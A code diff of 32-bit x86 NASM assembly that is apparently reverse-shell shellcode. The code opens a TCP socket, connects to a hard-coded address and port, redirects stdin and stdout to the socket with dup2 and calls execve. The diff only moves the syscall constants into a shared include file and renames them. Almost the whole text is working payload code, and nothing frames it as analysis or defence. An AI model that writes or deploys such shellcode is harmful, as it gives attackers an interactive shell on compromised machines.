@@ -1,18 +1,7 @@
 section .text
 global _start
 
-%define SOCKETCALL 	102
-%define READ  		3
-%define WRITE 		4
-%define EXIT		1
-%define EXECV		11
-%define DUP2		63	
-%define FORK		2
-%define WAITPID		7
-%define CLOSE		6
-	
-%define SYS_SOCKET 	1
-%define SYS_CONNECT	3
+    %include "../../../utils_linux_x86.asm"
 
 %define AF_INET		2
 %define SOCK_STREAM	1
@@ -20,7 +9,7 @@ global _start
 
 %define IP		0x0100007f
 %define PORT		0x0010
-	
+
 _start:
 .SOCKET:
 	push IPPROTO_TCP
@@ -30,12 +19,12 @@ _start:
 	xor ebx, ebx
 	xor eax, eax
 	mov ecx, esp
-	mov bl, SYS_SOCKET
-	mov al, SOCKETCALL
+	mov bl, SOCK_SOCKET
+	mov al, SYS_SOCKETCALL
 	int 0x80
 
 	mov esi, eax
-	
+
 .CONNECT:
 	mov eax, ~IP
 	not eax
@@ -52,23 +41,23 @@ _start:
 
 	mov ecx, esp
 	xor ebx, ebx
-	mov bl, SYS_CONNECT
+	mov bl, SOCK_CONNECT
 	xor eax, eax
-	mov al, SOCKETCALL
+	mov al, SYS_SOCKETCALL
 	int 0x80
-		
+
 .DUP2:
 	mov ebx, esi
 	xor ecx, ecx
 	xor eax, eax
-	mov al, DUP2
+	mov al, SYS_DUP2
 	int 0x80
 
 	mov ebx, esi
 	xor ecx, ecx
 	inc ecx
 	xor eax, eax
-	mov al, DUP2
+	mov al, SYS_DUP2
 	int 0x80
 
 .EXECV:
@@ -83,5 +72,5 @@ _start:
 
 	xor edx, edx
 	mov ecx, esp
-	mov al, EXECV
+	mov al, SYS_EXECV
 	int 0x80
